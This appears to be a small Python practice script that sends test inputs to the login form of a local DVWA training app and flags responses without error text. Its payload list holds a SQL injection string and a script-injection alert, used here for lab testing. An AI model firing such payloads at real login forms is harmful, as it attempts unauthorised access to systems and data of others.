import requests

def test_form_parameters(url, payloads):
    print(f"--- Testing form at {url} ---")
    
    for payload in payloads:
        form_data = {
            "username": payload,
            "password": "password"
        }
        
        try:
            response = requests.post(url, data=form_data, timeout=5)
            
            print(f"\n[+] Testing payload: '{payload}'")
            print(f"    Status Code: {response.status_code}")
            
            if "error" not in response.text.lower() and "failed" not in response.text.lower():
                print(f"    [!] Potential success or vulnerability found.")
                print(f"        Response snippet: {response.text[:100].strip()}...")
            else:
                print(f"    [-] Login likely failed as expected.")

        except requests.ConnectionError:
            print(f"\n[ERROR] Could not connect to {url}. Is the server running?")
            break
        except requests.RequestException as e:
            print(f"\n[ERROR] An error occurred with payload '{payload}': {e}")

if __name__ == "__main__":
    target_url = "http://localhost/DVWA/vulnerabilities/brute/"
    
    test_payloads = [
        "admin",
        "test' or '1'='1",
        "<script>alert('XSS')</script>"
    ]
    
    test_form_parameters(target_url, test_payloads)
